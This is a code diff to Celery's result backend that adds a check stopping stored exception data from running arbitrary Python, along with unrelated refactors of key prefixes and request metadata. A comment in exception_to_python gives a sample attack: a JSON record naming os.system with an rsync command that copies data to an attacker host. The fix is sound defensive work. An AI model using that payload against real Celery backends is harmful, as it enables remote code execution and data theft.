@@ -9,33 +9,28 @@ import sys
 import time
 import warnings
 from collections import namedtuple
-from datetime import datetime, timedelta
+from datetime import timedelta
 from functools import partial
 from weakref import WeakValueDictionary
 
 from billiard.einfo import ExceptionInfo
 from kombu.serialization import dumps, loads, prepare_accept_content
 from kombu.serialization import registry as serializer_registry
-from kombu.utils.encoding import bytes_to_str, ensure_bytes, from_utf8
+from kombu.utils.encoding import bytes_to_str, ensure_bytes
 from kombu.utils.url import maybe_sanitize_url
 
 import celery.exceptions
 from celery import current_app, group, maybe_signature, states
 from celery._state import get_current_task
 from celery.app.task import Context
-from celery.exceptions import (BackendGetMetaError, BackendStoreError,
-                               ChordError, ImproperlyConfigured,
-                               NotRegistered, TaskRevokedError, TimeoutError)
-from celery.result import (GroupResult, ResultBase, ResultSet,
-                           allow_join_result, result_from_tuple)
+from celery.exceptions import (BackendGetMetaError, BackendStoreError, ChordError, ImproperlyConfigured,
+                               NotRegistered, SecurityError, TaskRevokedError, TimeoutError)
+from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
 from celery.utils.collections import BufferMap
 from celery.utils.functional import LRUCache, arity_greater
 from celery.utils.log import get_logger
-from celery.utils.serialization import (create_exception_cls,
-                                        ensure_serializable,
-                                        get_pickleable_exception,
-                                        get_pickled_exception,
-                                        raise_with_context)
+from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
+                                        get_pickled_exception, raise_with_context)
 from celery.utils.time import get_exponential_backoff_interval
 
 __all__ = ('BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend')
@@ -136,6 +131,7 @@ class Backend:
         self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
         self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
         self.max_retries = conf.get('result_backend_max_retries', float("inf"))
+        self.thread_safe = conf.get('result_backend_thread_safe', False)
 
         self._pending_results = pending_results_t({}, WeakValueDictionary())
         self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
@@ -235,7 +231,7 @@ class Backend:
                         hasattr(errback.type, '__header__') and
 
                         # workaround to support tasks with bind=True executed as
-                        # link errors. Otherwise retries can't be used
+                        # link errors. Otherwise, retries can't be used
                         not isinstance(errback.type.__header__, partial) and
                         arity_greater(errback.type.__header__, 1)
                 ):
@@ -338,34 +334,73 @@ class Backend:
 
     def exception_to_python(self, exc):
         """Convert serialized exception to Python exception."""
-        if exc:
-            if not isinstance(exc, BaseException):
-                exc_module = exc.get('exc_module')
-                if exc_module is None:
-                    cls = create_exception_cls(
-                        from_utf8(exc['exc_type']), __name__)
-                else:
-                    exc_module = from_utf8(exc_module)
-                    exc_type = from_utf8(exc['exc_type'])
-                    try:
-                        # Load module and find exception class in that
-                        cls = sys.modules[exc_module]
-                        # The type can contain qualified name with parent classes
-                        for name in exc_type.split('.'):
-                            cls = getattr(cls, name)
-                    except (KeyError, AttributeError):
-                        cls = create_exception_cls(exc_type,
-                                                   celery.exceptions.__name__)
-                exc_msg = exc['exc_message']
-                try:
-                    if isinstance(exc_msg, (tuple, list)):
-                        exc = cls(*exc_msg)
-                    else:
-                        exc = cls(exc_msg)
-                except Exception as err:  # noqa
-                    exc = Exception(f'{cls}({exc_msg})')
+        if not exc:
+            return None
+        elif isinstance(exc, BaseException):
             if self.serializer in EXCEPTION_ABLE_CODECS:
                 exc = get_pickled_exception(exc)
+            return exc
+        elif not isinstance(exc, dict):
+            try:
+                exc = dict(exc)
+            except TypeError as e:
+                raise TypeError(f"If the stored exception isn't an "
+                                f"instance of "
+                                f"BaseException, it must be a dictionary.\n"
+                                f"Instead got: {exc}") from e
+
+        exc_module = exc.get('exc_module')
+        try:
+            exc_type = exc['exc_type']
+        except KeyError as e:
+            raise ValueError("Exception information must include "
+                             "the exception type") from e
+        if exc_module is None:
+            cls = create_exception_cls(
+                exc_type, __name__)
+        else:
+            try:
+                # Load module and find exception class in that
+                cls = sys.modules[exc_module]
+                # The type can contain qualified name with parent classes
+                for name in exc_type.split('.'):
+                    cls = getattr(cls, name)
+            except (KeyError, AttributeError):
+                cls = create_exception_cls(exc_type,
+                                           celery.exceptions.__name__)
+        exc_msg = exc.get('exc_message', '')
+
+        # If the recreated exception type isn't indeed an exception,
+        # this is a security issue. Without the condition below, an attacker
+        # could exploit a stored command vulnerability to execute arbitrary
+        # python code such as:
+        # os.system("rsync /data attacker@192.168.56.100:~/data")
+        # The attacker sets the task's result to a failure in the result
+        # backend with the os as the module, the system function as the
+        # exception type and the payload
+        # rsync /data attacker@192.168.56.100:~/data
+        # as the exception arguments like so:
+        # {
+        #   "exc_module": "os",
+        #   "exc_type": "system",
+        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
+        # }
+        if not isinstance(cls, type) or not issubclass(cls, BaseException):
+            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
+            raise SecurityError(
+                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")
+
+        # XXX: Without verifying `cls` is actually an exception class,
+        #      an attacker could execute arbitrary python code.
+        #      cls could be anything, even eval().
+        try:
+            if isinstance(exc_msg, (tuple, list)):
+                exc = cls(*exc_msg)
+            else:
+                exc = cls(exc_msg)
+        except Exception as err:  # noqa
+            exc = Exception(f'{cls}({exc_msg})')
+
         return exc
 
     def prepare_value(self, result):
@@ -425,7 +460,7 @@ class Backend:
                          state, traceback, request, format_date=True,
                          encode=False):
         if state in self.READY_STATES:
-            date_done = datetime.utcnow()
+            date_done = self.app.now()
             if format_date:
                 date_done = date_done.isoformat()
         else:
@@ -454,8 +489,11 @@ class Backend:
                     'retries': getattr(request, 'retries', None),
                     'queue': request.delivery_info.get('routing_key')
                     if hasattr(request, 'delivery_info') and
-                    request.delivery_info else None
+                    request.delivery_info else None,
                 }
+                if getattr(request, 'stamps', None):
+                    request_meta['stamped_headers'] = request.stamped_headers
+                    request_meta.update(request.stamps)
 
                 if encode:
                     # args and kwargs need to be encoded properly before saving
@@ -535,9 +573,10 @@ class Backend:
             pass
 
     def _ensure_not_eager(self):
-        if self.app.conf.task_always_eager:
+        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
             warnings.warn(
-                "Shouldn't retrieve result with task_always_eager enabled.",
+                "Results are not stored in backend and should not be retrieved when "
+                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                 RuntimeWarning
             )
 
@@ -779,10 +818,26 @@ class BaseKeyValueStoreBackend(Backend):
     def __init__(self, *args, **kwargs):
         if hasattr(self.key_t, '__func__'):  # pragma: no cover
             self.key_t = self.key_t.__func__  # remove binding
-        self._encode_prefixes()
         super().__init__(*args, **kwargs)
+        self._add_global_keyprefix()
+        self._encode_prefixes()
         if self.implements_incr:
             self.apply_chord = self._apply_chord_incr
+
+    def _add_global_keyprefix(self):
+        """
+        This method prepends the global keyprefix to the existing keyprefixes.
+
+        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
+        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
+        """
+        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
+        if global_keyprefix:
+            if global_keyprefix[-1] not in ':_-.':
+                global_keyprefix += '_'
+            self.task_keyprefix = f"{global_keyprefix}{self.task_keyprefix}"
+            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
+            self.chord_keyprefix = f"{global_keyprefix}{self.chord_keyprefix}"
 
     def _encode_prefixes(self):
         self.task_keyprefix = self.key_t(self.task_keyprefix)
@@ -812,23 +867,27 @@ class BaseKeyValueStoreBackend(Backend):
 
     def get_key_for_task(self, task_id, key=''):
         """Get the cache key for a task by id."""
-        key_t = self.key_t
-        return key_t('').join([
-            self.task_keyprefix, key_t(task_id), key_t(key),
-        ])
+        if not task_id:
+            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
+        return self._get_key_for(self.task_keyprefix, task_id, key)
 
     def get_key_for_group(self, group_id, key=''):
         """Get the cache key for a group by id."""
-        key_t = self.key_t
-        return key_t('').join([
-            self.group_keyprefix, key_t(group_id), key_t(key),
-        ])
+        if not group_id:
+            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
+        return self._get_key_for(self.group_keyprefix, group_id, key)
 
     def get_key_for_chord(self, group_id, key=''):
         """Get the cache key for the chord waiting on group with given id."""
+        if not group_id:
+            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
+        return self._get_key_for(self.chord_keyprefix, group_id, key)
+
+    def _get_key_for(self, prefix, id, key=''):
         key_t = self.key_t
+
         return key_t('').join([
-            self.chord_keyprefix, key_t(group_id), key_t(key),
+            prefix, key_t(id), key_t(key),
         ])
 
     def _strip_prefix(self, key):
@@ -1023,7 +1082,7 @@ class BaseKeyValueStoreBackend(Backend):
                     )
             finally:
                 deps.delete()
-                self.client.delete(key)
+                self.delete(key)
         else:
             self.expire(key, self.expires)
 
